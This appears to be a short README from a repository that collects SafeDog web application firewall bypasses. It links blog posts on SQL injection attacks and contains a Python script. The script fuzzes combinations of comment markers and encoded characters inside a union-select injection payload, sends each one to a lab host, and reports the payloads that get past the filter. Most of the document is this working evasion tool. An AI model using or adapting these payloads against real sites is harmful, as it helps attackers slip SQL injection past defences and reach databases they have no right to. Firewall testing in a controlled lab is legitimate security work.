# Bypass_Thinking(Bypass思路)
+ Record bypass and ideas/记录与绕过实例
  
# description(说明):

</br> This is about safe dog bypass:wink::cry::laughing: :yum:

    2017/9/03 => [Bypass SafeDog sql Attack(1)](http://www.inksec.cn/)

</br>

    2017/9/05 => [Bypass SafeDog sql Attack(2)](http://www.inksec.cn/)
  
</br>
  
    2017/9/06 => [Bypass SafeDog sql Attack(3)](http://www.inksec.cn/)  

## Fuzz_waf Thinking
```
# -*- coding: utf-8 -*-
import requests
fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|', '%00']
fuzz_sz = ['',' ']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","% 0j"]
fuzz = fuzz_zs+fuzz_sz+fuzz_ch
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.3 6 SE 2.X MetaSr 1.0"}
url_start = "http://192.168.1.107/sql.php?id=1"
for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                exp = "e1/*!50000/*!union"+a+b+c+d+"*/(select%201,2,3)/*--*/*/--%20-"
                url = url_start + exp
                res = requests.get(url = url , headers = headers)
                #print(res.text.find("true"))
                if res.text.find("true")==-1:
                    print("Find Fuzz bypass:"+url)
                    pass

```
